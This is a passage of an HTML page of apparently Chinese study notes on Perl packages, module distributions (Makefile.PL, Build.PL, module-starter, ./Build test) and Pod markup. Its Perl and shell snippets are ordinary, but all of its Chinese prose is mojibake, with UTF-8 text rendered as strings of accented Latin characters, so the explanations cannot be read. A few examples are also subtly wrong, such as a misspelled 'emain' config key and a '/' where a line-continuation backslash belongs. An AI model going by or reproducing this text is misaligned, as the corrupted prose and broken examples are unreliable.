$@</code></li><li>æ–‡ä»¶ä¸­çš„æœ€åä¸€ä¸ªæ±‚å€¼è¡¨è¾¾å¼å¿…é¡»è¿”å›ä¸€ä¸ªçœŸå€¼</li></ul><p>å› æ­¤, å¤§å¤šæ•°ç”¨äº <code>require</code> å¯¼å…¥çš„æ–‡ä»¶ä¸­, æœ€åä¸€è¡Œä»£ç æ€»æœ‰ä¸€ä¸ª <code>1</code> (æ¥ç¡®ä¿æœ€åçš„æ±‚å€¼è¡¨è¾¾å¼ä¸ºçœŸ).</p><h2 id="11-5-å‘½åç©ºé—´å†²çªçš„é—®é¢˜"><a href="#11-5-å‘½åç©ºé—´å†²çªçš„é—®é¢˜" class="headerlink" title="11.5 å‘½åç©ºé—´å†²çªçš„é—®é¢˜"></a>11.5 å‘½åç©ºé—´å†²çªçš„é—®é¢˜</h2><h2 id="11-6-ä½¿ç”¨åŒ…ä½œä¸ºå‘½åç©ºé—´åˆ†éš”ç¬¦"><a href="#11-6-ä½¿ç”¨åŒ…ä½œä¸ºå‘½åç©ºé—´åˆ†éš”ç¬¦" class="headerlink" title="11.6 ä½¿ç”¨åŒ…ä½œä¸ºå‘½åç©ºé—´åˆ†éš”ç¬¦"></a>11.6 ä½¿ç”¨åŒ…ä½œä¸ºå‘½åç©ºé—´åˆ†éš”ç¬¦</h2><p>ç”¨ <code>package</code> å‘½ä»¤. (ç”¨åœ¨æ¨¡å—ä¸­, è€Œä¸æ˜¯ä½ è¦è°ƒç”¨æ¨¡å—çš„æ–‡ä»¶)</p><figure class="highlight perl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs perl"><span class="hljs-keyword">package</span> Navigation;<br><br><span class="hljs-function"><span class="hljs-keyword">sub</span> <span class="hljs-title">turn_toward_heading</span> </span>&#123;<br>    ...<br>&#125;<br><br><span class="hljs-function"><span class="hljs-keyword">sub</span> <span class="hljs-title">turn_toward_port</span> </span>&#123;<br>    ...<br>&#125;<br></code></pre></td></tr></table></figure><p>å®é™…ä¸Šæ˜¯åœ¨è¿™ä¸ªæ¨¡å—ä¸­, ç»™å¤§å¤šæ•° (å˜é‡) åç§°ä¹‹å‰æ’å…¥ <code>Navigation::</code> å‰ç¼€. è¿™æ ·ç”¨ <code>require</code> å¯¼å…¥å°±å¯ä»¥é¿å…å‘½åå†²çª.</p><p>åŒ…ååº”å½“ä»¥ä¸€ä¸ªå¤§å†™å­—æ¯å¼€å¤´.</p><p>åŒ…åä¹Ÿå¯ä»¥ä¸ºç”±åŒå†’å·åˆ†å‰²çš„å¤šä¸ªåç§°, å¦‚ <code>Minnow::Navigation</code>.</p><h2 id="11-7-Package-æŒ‡ä»¤çš„ä½œç”¨åŸŸ"><a href="#11-7-Package-æŒ‡ä»¤çš„ä½œç”¨åŸŸ" class="headerlink" title="11.7 Package æŒ‡ä»¤çš„ä½œç”¨åŸŸ"></a>11.7 Package æŒ‡ä»¤çš„ä½œç”¨åŸŸ</h2><p>æ‰€æœ‰ Perl æ–‡ä»¶è¿è¡Œæ—¶å°±å¥½è±¡æˆ‘ä»¬æœ‰ä¸€ä¸ª main åŒ…å®šä¹‰åœ¨èµ·å§‹éƒ¨åˆ†. ç›´åˆ°å£°æ˜ä¸‹ä¸€æ¡åŒ…æŒ‡ä»¤ä¹‹å‰, å½“å‰æ‰€æœ‰åŒ…æŒ‡ä»¤ä»ç„¶æœ‰æ•ˆ, é™¤éåŒ…æŒ‡ä»¤åœ¨ä¸€ä¸ªå¸¦å¤§æ‹¬å·çš„ä½œç”¨åŸŸä¸­. åœ¨é‚£ç§æƒ…å†µä¸‹, Perl è§£é‡Šå™¨ä¼šè®°ä½ä¹‹å‰çš„åŒ…æŒ‡ä»¤, å½“å¸¦å¤§æ‹¬å·çš„ä½œç”¨åŸŸç»“æŸæ—¶, å°±è¿˜åŸä¹‹å‰çš„åŒ…æŒ‡ä»¤:</p><figure class="highlight perl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs perl"><span class="hljs-keyword">package</span> Navigation;<br><br>&#123;<br>    <span class="hljs-keyword">package</span> main;<br><br>    <span class="hljs-function"><span class="hljs-keyword">sub</span> <span class="hljs-title">turn_toward_heading</span> </span>&#123; <span class="hljs-comment"># main::turn_toward_heading</span><br>        ...<br>    &#125;<br>&#125;<br><br><span class="hljs-function"><span class="hljs-keyword">sub</span> <span class="hljs-title">turn_toward_port</span> </span>&#123; <span class="hljs-comment"># Navigation::turn_toward_port</span><br>    ...<br>&#125;<br></code></pre></td></tr></table></figure><p>å¤§å¤šæ•°åº“åœ¨æ–‡ä»¶çš„èµ·å§‹éƒ¨åˆ†ä»…æœ‰ä¸€ä¸ªåŒ…å£°æ˜, å¤§å¤šæ•°ç¨‹åºæŠŠ <code>main</code> åŒ…ä½œä¸ºé»˜è®¤çš„åŒ…å.</p><p>ä¸ç®¡å½“å‰åŒ…çš„å®šä¹‰å¦‚ä½•, ä¸€äº›åç§°æ€»åœ¨ <code>main</code> åŒ…ä¸­. (å…·ä½“è§ä¹¦)</p><h2 id="11-8-åŒ…å’Œä¸“é—¨è¯æ±‡"><a href="#11-8-åŒ…å’Œä¸“é—¨è¯æ±‡" class="headerlink" title="11.8 åŒ…å’Œä¸“é—¨è¯æ±‡"></a>11.8 åŒ…å’Œä¸“é—¨è¯æ±‡</h2><p>é€šè¿‡ <code>my</code> å…³é”®è¯å¼•å…¥çš„å˜é‡ä¸ä½¿ç”¨å½“å‰åŒ…ä½œä¸ºå‰ç¼€, å› ä¸ºåŒ…å˜é‡æ€»æ˜¯å…¨å±€å˜é‡ (è¯æ³•å˜é‡å¯¹äºç¨‹åºçš„ä¸€éƒ¨åˆ†è€Œè¨€é€šå¸¸æ˜¯ä¸´æ—¶çš„å¹¶ä¸”å¯è®¿é—®çš„)</p><p><code>our</code> å…³é”®è¯è¡¨æ˜ä¸€ä¸ª package ä¸­çš„å˜é‡å‰é¢å¯ä»¥ä¸ç”¨åŠ  package å.</p><p>å…·ä½“çœ‹:</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sh">$ perldoc -f our<br></code></pre></td></tr></table></figure><h3 id="åŒ…è¯­å¥å—"><a href="#åŒ…è¯­å¥å—" class="headerlink" title="åŒ…è¯­å¥å—"></a>åŒ…è¯­å¥å—</h3><p>å¯ä»¥ä½¿ç”¨è¯­å¥å—çš„è¯­æ³•:</p><figure class="highlight perl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs perl"><span class="hljs-keyword">package</span> Navigation &#123;<br>    <span class="hljs-keyword">my</span> @homeport = ...<br><br>    ...<br>&#125;<br><br><span class="hljs-keyword">package</span> DropAnchor &#123;<br>    ...<br>&#125;<br></code></pre></td></tr></table></figure><p>æ–°çš„åŒ…è¯­æ³•å…è®¸æŒ‡å®šä¸€ä¸ªç‰ˆæœ¬:</p><figure class="highlight perl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs perl"><span class="hljs-keyword">use</span> v5.<span class="hljs-number">12</span>;<br><br><span class="hljs-keyword">package</span> Navigation <span class="hljs-number">0</span>.<span class="hljs-number">01</span>;<br><br><span class="hljs-keyword">package</span> DropAnchor <span class="hljs-number">1.23</span> &#123; ... &#125;;<br></code></pre></td></tr></table></figure><h1 id="ç¬¬12ç« -åˆ›å»ºä½ è‡ªå·±çš„å‘è¡Œç‰ˆ"><a href="#ç¬¬12ç« -åˆ›å»ºä½ è‡ªå·±çš„å‘è¡Œç‰ˆ" class="headerlink" title="ç¬¬12ç«  åˆ›å»ºä½ è‡ªå·±çš„å‘è¡Œç‰ˆ"></a>ç¬¬12ç«  åˆ›å»ºä½ è‡ªå·±çš„å‘è¡Œç‰ˆ</h1><h2 id="12-1-Perl-æ¨¡å—çš„ä¸¤ä¸ªæ„å»ºç³»ç»Ÿ"><a href="#12-1-Perl-æ¨¡å—çš„ä¸¤ä¸ªæ„å»ºç³»ç»Ÿ" class="headerlink" title="12.1 Perl æ¨¡å—çš„ä¸¤ä¸ªæ„å»ºç³»ç»Ÿ"></a>12.1 Perl æ¨¡å—çš„ä¸¤ä¸ªæ„å»ºç³»ç»Ÿ</h2><p>Perl æœ‰ä¸¤ç§å¸¸è§çš„å‘è¡Œç‰ˆæ„å»ºç³»ç»Ÿ:</p><ul><li>ExtUtils::Makemaker, åŸºäº make æ„å»º, ä½¿ç”¨ä¸€ä¸ªå«åš Makefile.PL çš„æ–‡ä»¶æ¥æ§åˆ¶æ„å»ºè¿‡ç¨‹</li><li>Module::Build, ä½¿ç”¨ Build.PL æ–‡ä»¶</li></ul><h3 id="12-1-1-åœ¨-Makefile-PL-å†…éƒ¨"><a href="#12-1-1-åœ¨-Makefile-PL-å†…éƒ¨" class="headerlink" title="12.1.1 åœ¨ Makefile.PL å†…éƒ¨"></a>12.1.1 åœ¨ Makefile.PL å†…éƒ¨</h3><p>å¯åœ¨ ExtUtils::Makemaker æ¨¡å—çš„æ–‡æ¡£ä¸­äº†è§£é…ç½®ç»†èŠ‚.</p><p><code>PREREQ_PM</code> é”®çš„å€¼ï¼Œåˆ—åƒäº†åœ¨è¿è¡Œä»£ç æ—¶éœ€è¦çš„ä»¥æ¥æ¨¡å—åŠå…¶ç‰ˆæœ¬å·, å½“åœ¨è¿™é‡Œåˆ—å‡ºä»¥æ¥çš„æ¨¡å—æ—¶ï¼ŒCPAN å®¢æˆ·ç«¯éƒ½èƒ½å¤Ÿè‡ªåŠ¨è·å–ï¼Œæ„å»ºå¹¶ä¸”å®‰è£…å®ƒä»¬.</p><figure class="highlight perl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs perl">...<br><span class="hljs-string">PREREQ_PM =&gt;</span> &#123;<br>    <span class="hljs-string">&#x27;Test::More&#x27;</span> =&gt; <span class="hljs-number">0</span>,<br>&#125;,<br>...<br></code></pre></td></tr></table></figure><p>æŒ‡å®šæ¨¡å—çš„ç‰ˆæœ¬:</p><figure class="highlight perl"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs perl"><span class="hljs-keyword">use</span> ExtUtils::Makemaker <span class="hljs-number">6.65</span>;<br></code></pre></td></tr></table></figure><p>å¦ä¸€ä¸ªæœ‰ç”¨çš„è®¾ç½® <code>EXE_FILES</code> é”®, åœ¨å®ƒå¯¹åº”çš„å€¼é‡Œé¢åˆ—å‡ºå‘è¡Œç‰ˆä¸­åŒ…å«çš„å¯å®‰è£…ç¨‹åº:</p><figure class="highlight perl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs perl"><span class="hljs-keyword">use</span> ExtUtils::Makemaker <span class="hljs-number">6.65</span>;<br><br>WriteMakefile(<br>    ...<br>    <span class="hljs-string">EXE_FILES =&gt;</span> [ <span class="hljs-string">qw( scripts/barnyard.pl )</span> ],<br>    ...<br><br>);<br>    <br></code></pre></td></tr></table></figure><h3 id="12-1-2-åœ¨-Build-PL-æ–‡ä»¶å†…éƒ¨"><a href="#12-1-2-åœ¨-Build-PL-æ–‡ä»¶å†…éƒ¨" class="headerlink" title="12.1.2 åœ¨ Build.PL æ–‡ä»¶å†…éƒ¨"></a>12.1.2 åœ¨ Build.PL æ–‡ä»¶å†…éƒ¨</h3><p>Module::Build::API çš„æ–‡æ¡£è§£é‡Šäº†æœ‰æ•ˆé”®çš„æ‰€æœ‰ä¿¡æ¯.</p><h2 id="12-2-æˆ‘ä»¬çš„ç¬¬ä¸€ä¸ªå‘è¡Œç‰ˆ"><a href="#12-2-æˆ‘ä»¬çš„ç¬¬ä¸€ä¸ªå‘è¡Œç‰ˆ" class="headerlink" title="12.2 æˆ‘ä»¬çš„ç¬¬ä¸€ä¸ªå‘è¡Œç‰ˆ"></a>12.2 æˆ‘ä»¬çš„ç¬¬ä¸€ä¸ªå‘è¡Œç‰ˆ</h2><h3 id="12-2-1-h2xs-å·¥å…·"><a href="#12-2-1-h2xs-å·¥å…·" class="headerlink" title="12.2.1 h2xs å·¥å…·"></a>12.2.1 h2xs å·¥å…·</h3><p>h2xs ç”¨æ¥å°† C è¯­è¨€çš„ <code>.h</code> å¤´æ–‡ä»¶è½¬æ¢æˆ <code>.xs</code> æ–‡ä»¶ï¼Œä½œä¸ºè¿æ¥ C å’Œ Perl çš„èƒ¶æ°´è¯­è¨€.</p><p>ä½¿ç”¨ <code>-A</code> å’Œ <code>-X</code> å‚æ•°æ¥å…³é—­ <code>AUTOLOAD</code> å’Œ <code>XS</code> ç‰¹æ€§. ä½¿ç”¨ <code>-n</code> å¼€å…³è®¾ç½®æ¨¡å—åç§°:</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sh">$ h2xs -AX -n Animal<br></code></pre></td></tr></table></figure><p>è¿™å°†åˆ›å»ºä¸€ç³»åˆ—æ–‡ä»¶.</p><h3 id="12-2-2-Module-Starter-æ¨¡å—"><a href="#12-2-2-Module-Starter-æ¨¡å—" class="headerlink" title="12.2.2 Module::Starter æ¨¡å—"></a>12.2.2 Module::Starter æ¨¡å—</h3><p>æ›´åŠ é€šç”¨çš„åšæ³•æ˜¯ä½¿ç”¨ Module::Starter æ¨¡å—, è¯¥æ¨¡å—å¹¶ä¸åŒ…å«åœ¨æ ‡å‡†åº“ä¸­.</p><p>é€šè¿‡ module-starter ç¨‹åºï¼Œå¯ä»¥è®¾å®šæˆ‘ä»¬çš„å§“åå’Œç”µå­é‚®ç®±ï¼Œè¿™äº›ä¿¡æ¯å°†è¢«æ’å…¥ç›¸å…³æ–‡ä»¶åˆé€‚çš„åœ°æ–¹.</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs sh">$ module-starter --module=Animal --author=<span class="hljs-string">&quot;Gilligan&quot;</span> /<br>--email=gilligan@island.example.com --verbose<br></code></pre></td></tr></table></figure><p>é»˜è®¤æƒ…å†µä¸‹ï¼Œ module-starter ç¨‹åºä¼šåˆ›å»ºä¸€ä¸ªå¸¦ Makefile.PL çš„å®‰è£…ç›®å½•ç³»ç»Ÿå‘è¡Œç‰ˆ. </p><p>å¦‚æœäº«ç”¨ Module::Build æ¨¡å—æ›¿ä»£ï¼Œä½¿ç”¨ <code>--builder</code> å‚æ•°:</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs sh">$ module-starter --builder=<span class="hljs-string">&quot;Module::Build&quot;</span> --module=Animal --author=<span class="hljs-string">&quot;Gilligan&quot;</span> /<br>--email=gilligan@island.example.com --verbose<br></code></pre></td></tr></table></figure><p>module-starter çš„é…ç½®æ–‡ä»¶ä½äº <code>$HOME/.module-starter/config</code>, ä¹Ÿå¯ä»¥è®¾ç½® <code>MODULE_STARTER_DIR</code> ç¯å¢ƒå˜é‡æ¥æŒ‡å®šåŒ…å« config çš„ç›®å½•åç§°.</p><p>åœ¨é…ç½®æ–‡ä»¶å†…éƒ¨ï¼Œå¯ä»¥åˆ—å‡ºç”¨å†’å·åˆ†å‰²çš„æ‰€æœ‰å‚æ•°åç§°å’Œå€¼:</p><figure class="highlight dts"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs dts"><span class="hljs-symbol">author:</span> Willie Gilligan<br><span class="hljs-symbol">emain:</span> gilligan@island.example.com<br><span class="hljs-symbol">builder:</span> Module::Build<br><span class="hljs-symbol">verbose:</span> <span class="hljs-number">1</span><br></code></pre></td></tr></table></figure><p>ä¹‹ååªéœ€è¦è¿è¡Œ:</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sh">$ module-starter --module=Animal<br></code></pre></td></tr></table></figure><p>å°±å¯ä»¥è¾¾åˆ°åŒæ ·çš„æ•ˆæœ.</p><h3 id="12-2-3-å®šåˆ¶æ¨¡æ¿"><a href="#12-2-3-å®šåˆ¶æ¨¡æ¿" class="headerlink" title="12.2.3 å®šåˆ¶æ¨¡æ¿"></a>12.2.3 å®šåˆ¶æ¨¡æ¿</h3><p>Module::Starter::Plugin æ¨¡å—çš„æ–‡æ¡£å±•ç¤ºäº†å¦‚ä½•åˆ›å»ºè‡ªå·±çš„æ’ä»¶.</p><p>å¯¹äºçœŸæ­£å¤æ‚çš„æ¨¡å—åˆ›å»ºï¼Œå¯ä»¥ä½¿ç”¨ Dist::Zilla æ¨¡å—.</p><h2 id="12-3-åœ¨ä½ çš„å‘è¡Œç‰ˆå†…éƒ¨"><a href="#12-3-åœ¨ä½ çš„å‘è¡Œç‰ˆå†…éƒ¨" class="headerlink" title="12.3 åœ¨ä½ çš„å‘è¡Œç‰ˆå†…éƒ¨"></a>12.3 åœ¨ä½ çš„å‘è¡Œç‰ˆå†…éƒ¨</h2><p>è¿è¡Œæ„å»ºè„šæœ¬:</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sh">$ perl Build.PL<br></code></pre></td></tr></table></figure><p><code>Build.PL</code> ä¼šæ£€æŸ¥å‘è¡Œç‰ˆï¼Œç¡®ä¿å®ƒæ‰€éœ€è¦çš„æ‰€æœ‰æ–‡ä»¶æ˜¯å®Œæ•´çš„ï¼Œæ¯ä¸ªå‘è¡Œç‰ˆå°†åœ¨ <code>MANIFEST</code> æ–‡ä»¶è®°å½•æ£€æŸ¥çš„ç»“æœ.</p><p>ä¸€æ—¦ <code>Build.PL</code> æ–‡ä»¶å®Œæˆäº†æ£€æŸ¥ï¼Œå®ƒå°†åˆ›å»ºä¸€ä¸ªç¨‹åºï¼Œå…¶ä¸­åŒ…å« Perl çš„è®¾ç½®ï¼Œæ¨¡å—çš„è·¯å¾„å’Œå…¶ä»–ä¸€äº›ä¿¡æ¯.</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sh">$ ./Build<br></code></pre></td></tr></table></figure><p>å…¶:</p><ol><li>ä» lib ç›®å½•å°†æ¨¡å—æ–‡ä»¶å¤åˆ¶åˆ°æ„å»ºåº“ blib ç›®å½•ä¸­ , è¿™æ˜¯æ„å»ºç³»ç»Ÿç”¨æ¥ä¿å­˜æ‰€æœ‰å‡†å¤‡å®‰è£…æ–‡ä»¶çš„ä½ç½®</li><li>Module::Build æ¨¡å—å°† Animal æ¨¡å—å†…ç½®çš„æ–‡æ¡£è£…æ¢æˆ UNIX ç³»ç»Ÿä¸­ç±»ä¼¼çš„æ‰‹å†Œé¡µ (manpage), ç„¶åæ”¾ç½®åˆ° <code>blib/libdoc</code> ç›®å½•ä¸­.</li></ol><p>æµ‹è¯•å‘½ä»¤:</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sh">$ ./Build <span class="hljs-built_in">test</span><br></code></pre></td></tr></table></figure><p>æµ‹è¯•çš„è„šæœ¬ç”±ä¹‹å‰ <code>module-starter</code> å‘½ä»¤åˆ›å»ºäº <code>t</code> ç›®å½•ä¸­.</p><p>å¦ä¸€ä¸ªæµ‹è¯•å‚æ•° <code>disttest</code>, ç”¨äºå‘å¸ƒå‘è¡Œç‰ˆä¹‹å‰. ç”¨æ¥æ£€æŸ¥æˆ‘ä»¬å³å°†æ”¾å…¥å‹ç¼©åŒ…å’Œå‘å¸ƒçš„å†…å®¹å·²ç»åŒ…å«æµ‹è¯•æ‰€éœ€çš„æ‰€æœ‰ä¿¡æ¯:</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sh">$ ./Build disttest<br></code></pre></td></tr></table></figure><p>è¿‡ç¨‹: Build ä¼šä¸ºå®ƒå³å°†åˆ›å»ºçš„å‹ç¼©åŒ…æ–‡ä»¶åˆ›å»ºä¸€ä¸ªå­ç›®å½•ï¼Œå°† MANIFEST ä¸­åˆ—å‡ºçš„æ‰€æœ‰æ–‡ä»¶å¤åˆ¶è¿›å»ï¼Œåˆ‡æ¢åˆ°å­ç›®å½•çš„ä½ç½®ï¼Œç„¶åå†æ¬¡æ‰§è¡Œæµ‹è¯•.</p><p>çœŸæ­£å‡†å¤‡å¥½å‘å¸ƒå‘è¡Œç‰ˆæ—¶ï¼Œæ‰§è¡Œ <code>dist</code> å‚æ•°ï¼ŒMAINIFFEST æ–‡ä»¶ä¸­åˆ—å‡ºçš„æ‰€æœ‰æ–‡ä»¶éƒ½å°†è¢«é‡æ–°ç»„ç»‡.</p><h3 id="12-3-1-META-æ–‡ä»¶"><a href="#12-3-1-META-æ–‡ä»¶" class="headerlink" title="12.3.1 META æ–‡ä»¶"></a>12.3.1 META æ–‡ä»¶</h3><p>å®¢æˆ·ç«¯å¯ä»¥æ ¹æ® <code>META.json</code> å’Œ <code>META.yml</code> æ–‡ä»¶çš„ä¿¡æ¯åˆ¤æ–­å®ƒéœ€è¦åšä»€ä¹ˆäº‹æƒ….</p><p><code>_require</code> å­—æ®µåˆ—å‡ºå®‰è£…ç¯å¢ƒéœ€è¦æ»¡è¶³çš„æ¡ä»¶.</p><h3 id="12-3-2-æ·»åŠ é¢å¤–çš„æ¨¡å—"><a href="#12-3-2-æ·»åŠ é¢å¤–çš„æ¨¡å—" class="headerlink" title="12.3.2 æ·»åŠ é¢å¤–çš„æ¨¡å—"></a>12.3.2 æ·»åŠ é¢å¤–çš„æ¨¡å—</h3><p>ä¸€å¼€å§‹é…’å§å¤šä¸ªæ¨¡å—æ–‡ä»¶æ”¾å…¥ä¸€ä¸ªå‘è¡Œç‰ˆä¸­:</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sh">$ module-starter --module=Animal,Cow,Horse,Mouse<br></code></pre></td></tr></table></figure><p>åœ¨åˆ›å»ºå‘è¡Œç‰ˆä¹‹åï¼Œè¿˜æƒ³å¾€å‘è¡Œç‰ˆä¸­æ·»åŠ æ–°çš„æ¨¡å—æ–‡ä»¶ï¼Œä½¿ç”¨ Module::Starter::AddModule æ¨¡å—, ä½†è¿™ä¸ªæ¨¡å—éœ€è¦å®‰è£…å¥½, å¯ä»¥å°† <code>module-starter</code> çš„é…ç½®æ–‡ä»¶å†™ä¸º:</p><figure class="highlight dts"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs dts"><span class="hljs-symbol">author:</span> Willie Gilligan<br><span class="hljs-symbol">emain:</span> gilligan@island.example.com<br><span class="hljs-symbol">builder:</span> Module::Build<br><span class="hljs-symbol">verbose:</span> <span class="hljs-number">1</span><br><span class="hljs-symbol">plugins:</span> Module::Starter::AddModule<br></code></pre></td></tr></table></figure><p>ç”¨ <code>module-starter</code> æ·»åŠ æ—¶éœ€è¦ç”¨ <code>--dist</code> å‚æ•°æŒ‡å®šæ·»åŠ åˆ°å“ªä¸€ä¸ªå‘è¡Œç‰ˆï¼Œç”¨ <code>--module</code> å‚æ•°æŒ‡å®šè¦æ·»åŠ çš„æ¨¡å—:</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sh">$ module-starter --module=Sheep --dist=Animal<br></code></pre></td></tr></table></figure><p>æ·»åŠ çš„æ¨¡å—ä¹Ÿæ˜¯ä¸€ä¸ªæ–°çš„æ¨¡å—ï¼Œè€Œä¸æ˜¯ cpan ä¸Šå·²æœ‰çš„æ¨¡å—. å®é™…ä¸Šå°±æ˜¯æ·»åŠ æ¨¡å—çš„æ¨¡æ¿æ–‡ä»¶.</p><h2 id="12-4-æ¨¡å—å†…éƒ¨"><a href="#12-4-æ¨¡å—å†…éƒ¨" class="headerlink" title="12.4 æ¨¡å—å†…éƒ¨"></a>12.4 æ¨¡å—å†…éƒ¨</h2><p>Perl æœ‰ä¸€ä¸ªåµŒå…¥å¼çš„æ–‡æ¡£ç§°ä¸º Pod, å®ƒæ˜¯ Plain olâ€™Documentation çš„ç®€ç§°. å¯ä»¥åœ¨ä»£ç éƒ¨åˆ†ä¹‹é—´æ”¾ç½® Pod, å°±æ˜¯ä¸€äº›ä»£ç æ¥ç€ä¸€äº›æ–‡æ¡£ï¼Œå†æ¥ç€ä¸€äº›ä»£ç çš„æ ¼å¼.</p><p>å¯åœ¨ <code>perlpod</code> å’Œ <code>perlpodspec</code> ä¸¤ä¸ªæ–‡æ¡£ä¸­å‚è€ƒ Pod çš„æ–‡æœ¬æ ¼å¼è§„èŒƒ.</p><h2 id="12-5-è€å¼æ–‡æ¡£"><a href="#12-5-è€å¼æ–‡æ¡£" class="headerlink" title="12.5 è€å¼æ–‡æ¡£"></a>12.5 è€å¼æ–‡æ¡£</h2><p>Perl è§£æå™¨ä¼šå¿½ç•¥æ–‡æ¡£éƒ¨åˆ†.</p><p><code>perldoc</code> ç¨‹åºä¼šå¿½ç•¥ä»£ç éƒ¨åˆ†.</p><p>å¯ä»¥ç›´æ¥ç”¨ <code>perldoc</code> æ¥é˜…è¯» Pod æ–‡æ¡£éƒ¨åˆ†:</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sh">$ perldoc lib/Animal.pm<br></code></pre></td></tr></table></figure><p>é»˜è®¤æƒ…å†µä¸‹ï¼Œ<code>perldoc</code> å€ŸåŠ© <code>nroff</code> å‘½ä»¤.</p><p>å¯ä»¥ç”¨ <code>pod2html</code> ç¨‹åºå°† Pod è½¬æ¢æˆ HTML æ ¼å¼:</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sh">$ pod2html lib/Animal.pm<br></code></pre></td></tr></table></figure><h3 id="12-5-1-æ®µè½çš„-Pod-å‘½ä»¤"><a href="#12-5-1-æ®µè½çš„-Pod-å‘½ä»¤" class="headerlink" title="12.5.1 æ®µè½çš„ Pod å‘½ä»¤"></a>12.5.1 æ®µè½çš„ Pod å‘½ä»¤</h3><p><code>=headn</code> æŒ‡å®šä¸€ä¸ªæ ‡é¢˜.</p><p><code>=head1</code> æ˜¯ä¸€çº§æ ‡é¢˜.</p><p><code>=head2</code> æ˜¯äºŒçº§æ ‡é¢˜.</p><p>éœ€è¦è¿”å›ä»£ç æ¨¡å¼æ—¶ï¼Œå°±ä»¥ <code>=cut</code> è¯­å¥ç»“æŸ.</p><figure class="highlight excel"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs excel">=head1 NAME<br><br>=head1 DESCRIPTION<br><br>=head2 Functions<br><br>=cut<br></code></pre></td></tr></table></figure><p>å¯ä»¥ç”¨ <code>=over n</code> æ¥åˆ›å»ºåˆ—è¡¨, åˆ—è¡¨çš„æ¯ä¸ªå…ƒç´ ç”¨ <code>=item</code> æ¥æ ‡è®°.</p><figure class="highlight excel"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs excel">=over <span class="hljs-number">4</span><br><br>=item <span class="hljs-number">1</span>. Gilligan<br><br>=item <span class="hljs-number">2</span>. Skipper<br><br>=item <span class="hljs-number">3</span>. Ginger<br><br>=back<br></code></pre></td></tr></table></figure><p>ä½¿ç”¨ <code>*</code> å°±ä¼šæ˜¾ç¤º <code>*</code>:</p><figure class="highlight excel"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs excel">=over <span class="hljs-number">4</span><br><br>=item * Gilligan<br><br>=item * Skipper<br><br>=item * Ginger<br><br>=back<br></code></pre></td></tr></table></figure><h3 id="12-5-2-Pod-æ®µè½"><a href="#12-5-2-Pod-æ®µè½" class="headerlink" title="12.5.2 Pod æ®µè½"></a>12.5.2 Pod æ®µè½</h3><p>åœ¨æ–‡æ¡£ä¸­åŠ 